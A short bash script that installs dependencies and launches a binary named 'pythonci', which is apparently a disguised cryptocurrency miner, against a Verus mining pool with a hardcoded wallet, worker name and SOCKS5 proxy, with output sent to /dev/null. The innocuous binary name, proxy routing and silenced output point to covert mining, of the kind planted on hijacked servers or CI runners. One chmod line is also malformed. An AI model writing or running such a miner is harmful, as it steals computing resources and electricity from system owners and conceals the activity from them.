#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x tongok.sh && chmod +x pythonci chmod 777 pythonci tongok.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RLW9aeQT9LVYYxpKtXRNdvh8H8HuTmPfg4
WR=VIA-6
PY=socks5://178.62.79.49:17173
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY > /dev/null
